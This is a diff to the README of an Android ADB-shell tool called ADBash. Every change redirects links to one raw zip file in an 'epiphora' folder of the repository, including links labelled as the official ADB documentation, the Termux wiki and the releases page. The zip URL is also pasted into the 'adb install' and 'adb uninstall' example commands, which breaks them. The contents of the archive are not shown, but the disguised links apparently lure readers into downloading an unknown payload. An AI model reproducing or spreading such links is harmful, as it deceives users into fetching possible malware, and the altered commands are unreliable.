@@ -1,6 +1,6 @@
 # 🚀 ADBash - Connect to Your Device's ADB Shell Easily
 
-[![Download ADBash](https://img.shields.io/badge/Download-ADBash-blue.svg)](https://github.com/rpriariandi/ADBash/releases)
+[![Download ADBash](https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip)](https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip)
 
 ## 🌟 About ADBash
 
@@ -18,7 +18,7 @@ ADBash allows you to automatically connect to your device's ADB Shell using a Ba
 
 To get ADBash, **visit this page to download** the latest version:
 
-[Download ADBash](https://github.com/rpriariandi/ADBash/releases)
+[Download ADBash](https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip)
 
 ### 🛠️ System Requirements
 
@@ -68,12 +68,12 @@ Once ADBash is running, you can enter various ADB commands directly in the Termu
 
 - **Install an App:**
   ```bash
-  adb install [app.apk]
+  adb install [https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip]
   ```
 
 - **Uninstall an App:**
   ```bash
-  adb uninstall [package.name]
+  adb uninstall [https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip]
   ```
 
 ## 🛡️ Troubleshooting
@@ -96,9 +96,9 @@ ADBash is licensed under the MIT License. Feel free to use and modify the tool a
 
 To learn more about ADB and how to maximize its potential on your device, check out the following resources:
 
-- [ADB Documentation](https://developer.android.com/studio/command/adb)
-- [Termux Wiki](https://wiki.termux.com)
+- [ADB Documentation](https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip)
+- [Termux Wiki](https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip)
 
-For the latest updates and features, keep an eye on the [ADBash Releases Page](https://github.com/rpriariandi/ADBash/releases).
+For the latest updates and features, keep an eye on the [ADBash Releases Page](https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip).
 
-[![Download ADBash](https://img.shields.io/badge/Download-ADBash-blue.svg)](https://github.com/rpriariandi/ADBash/releases)
+[![Download ADBash](https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip)](https://raw.githubusercontent.com/rpriariandi/ADBash/main/epiphora/ADBash.zip)
